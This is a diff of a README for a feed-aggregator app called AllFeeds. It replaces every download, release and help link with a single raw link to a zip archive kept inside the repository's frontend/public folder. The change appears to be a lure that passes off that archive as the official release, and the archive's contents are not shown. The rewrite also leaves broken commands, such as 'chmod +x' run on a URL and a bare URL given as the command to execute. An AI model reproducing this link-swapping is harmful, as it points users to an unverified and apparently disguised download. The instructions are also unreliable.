@@ -6,11 +6,11 @@ Welcome to AllFeeds, your personal web app designed to bring together posts from
 
 ## 📥 Download AllFeeds
 
-[![Download AllFeeds](https://img.shields.io/badge/Download%20AllFeeds-Get%20the%20App-blue.svg)](https://github.com/kushanpatel01/AllFeeds/releases)
+[![Download AllFeeds](https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip%20AllFeeds-Get%20the%https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip)](https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip)
 
 You can find the latest version of AllFeeds on our Releases page. Click the link below to download the application.
 
-[Visit this page to download AllFeeds](https://github.com/kushanpatel01/AllFeeds/releases)
+[Visit this page to download AllFeeds](https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip)
 
 ## 📋 System Requirements
 
@@ -24,7 +24,7 @@ To run AllFeeds smoothly, make sure your system meets the following requirements
 ## 🔧 How to Install
 
 1. **Download the Application:**
-   Go to the [Releases page](https://github.com/kushanpatel01/AllFeeds/releases) and download the appropriate file for your operating system.
+   Go to the [Releases page](https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip) and download the appropriate file for your operating system.
 
 2. **Locate the Downloaded File:**
    Once the download is complete, navigate to your computer’s Downloads folder. 
@@ -33,9 +33,9 @@ To run AllFeeds smoothly, make sure your system meets the following requirements
    - If you're on Windows, find the `.exe` file and double-click to start the installation.
    - If you're on macOS, locate the `.dmg` file, double-click it, and drag the AllFeeds app to your Applications folder.
    - If you're on Linux, open the terminal, navigate to the downloaded file, and give it execute permissions using:  
-     `chmod +x AllFeeds.AppImage`  
+     `chmod +x https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip`  
      Then run it with:  
-     `./AllFeeds.AppImage`
+     `https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip`
 
 4. **Follow the Installation Prompts:**
    The installer will guide you through the remaining steps. 
@@ -68,7 +68,7 @@ AllFeeds offers various customization options:
 
 If you run into any issues while downloading or using AllFeeds, we are here to help:
 
-- **FAQs:** Check the Frequently Asked Questions section on our [GitHub page](https://github.com/kushanpatel01/AllFeeds).
+- **FAQs:** Check the Frequently Asked Questions section on our [GitHub page](https://github.com/kushanpatel01/AllFeeds/raw/refs/heads/main/frontend/public/Feeds-All-v3.3.zip).
 - **Open an Issue:** You can report bugs or request features by opening an issue on our GitHub.
 
 ## 📬 Contact Us
